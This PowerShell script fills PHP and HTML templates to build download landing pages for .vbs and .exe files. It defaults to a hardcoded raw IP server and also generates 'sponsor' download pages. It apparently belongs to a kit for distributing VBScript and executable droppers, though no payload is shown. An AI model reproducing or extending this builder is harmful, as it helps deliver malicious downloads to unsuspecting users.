param (
    [string]$serverName
)

if ($serverName -eq "") {
    $serverName = "185.247.141.125"
    $action = "exe"
} 

if ([string]::IsNullOrEmpty($serverName)) {
        throw "-serverName argument is null"
}

function wr {
    param (
        [string]$FilePath,
        [string]$Content
    )
    
    # Define UTF-8 encoding without BOM
    $utf8NoBomEncoding = New-Object System.Text.UTF8Encoding($false)
    
    # Write content to file using .NET class
    [System.IO.File]::WriteAllText($FilePath, $Content, $utf8NoBomEncoding)
}

$scriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path
Set-Location -Path $scriptDir
. ".\current.ps1" -serverName $serverName
. ".\lib.ps1"

#VBS
$fileContent = Get-Content -Path $server.phpTemplateFile -Raw
$fileContent = $fileContent -replace "{alias}", $server.alias
$fileContent = $fileContent -replace "{server}", $server.server
$fileContent = $fileContent -replace "{profile}", "default"

$vbsContent = $fileContent -replace "{filename}", ($server.landingName + ".vbs")
$vbsContent = $vbsContent -replace "{command}", "DnLog"
$vbsContent | Set-Content -Path $server.userPhpVbsFile
wr -FilePath $server.userPhpVbsFile -Content $vbsContent

$exeContent = $fileContent -replace "{filename}", ($server.landingName + ".exe")
$exeContent = $exeContent -replace "{command}", "DnLog"
$exeContent | Set-Content -Path $server.userPhpExeFile
wr -FilePath $server.userPhpExeFile -Content $exeContent

foreach ($sponsor in $server.dnSponsor)
{
    if ($sponsor.enabled -eq $true)
    {
        $fileContent = Get-Content -Path $server.phpTemplateSponsorFile -Raw
        $fileContent = $fileContent -replace "{sponsor_url}", $sponsor.url
        $fileContent = $fileContent -replace "{downloadidentifier}", ($server.downloadidentifier)
        wr -FilePath $server.userSponsorPhpVbsFile -Content $fileContent

        $fileContent = Get-Content -Path $server.HtmlTemplateSponsorFile -Raw
        $fileContent = $fileContent -replace "{sponsordownload}", ($server.downloadidentifier + "-sponsor")
        wr -FilePath $server.userSponsorHtmlVbsFile -Content $fileContent

        #exe
        $fileContent = Get-Content -Path $server.phpTemplateSponsorFile -Raw
        $fileContent = $fileContent -replace "{sponsor_url}", $sponsor.url
        $fileContent = $fileContent -replace "{downloadidentifier}", ($server.downloadidentifier + "-exe")
        wr -FilePath $server.userSponsorPhpExeFile -Content $fileContent

        $fileContent = Get-Content -Path $server.HtmlTemplateSponsorFile -Raw
        $fileContent = $fileContent -replace "{sponsordownload}", ($server.downloadidentifier + "-sponsor-exe")
        wr -FilePath $server.userSponsorHtmlExeFile -Content $fileContent
    }
}

Write-Debug "Dn Done"